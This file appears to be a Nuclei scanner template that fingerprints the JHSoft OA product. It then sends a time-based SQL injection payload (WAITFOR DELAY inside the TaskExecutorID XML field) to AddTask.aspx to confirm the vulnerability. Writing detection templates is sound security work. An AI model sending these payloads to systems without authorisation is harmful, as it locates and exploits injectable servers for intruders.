id: poc-yaml-jinher-addtask-aspx-sqli

info:
  name: "JHSoft OA AddTask.aspx SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: JHSoft OA

flow: http(1) && http(2)

http:
  - id: check-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"

  - id: sqli-check
    raw:
      - |
        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        
        <root>
        <Page>
        <PageName>TaskDetect</PageName>
        </Page>
        <StartTime>2023-01-01 00:00:00</StartTime>
        <EndTime>2023-01-01 00:00:00</EndTime>
        <TaskExecutorID>3');WAITFOR DELAY'0:0:5'-- </TaskExecutorID>
        </root>
      - |
        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        
        <root>
        <Page>
        <PageName>TaskDetect</PageName>
        </Page>
        <StartTime>2023-01-01 00:00:00</StartTime>
        <EndTime>2023-01-01 00:00:00</EndTime>
        <TaskExecutorID>3');WAITFOR DELAY'0:0:8'-- </TaskExecutorID>
        </root>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "1"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
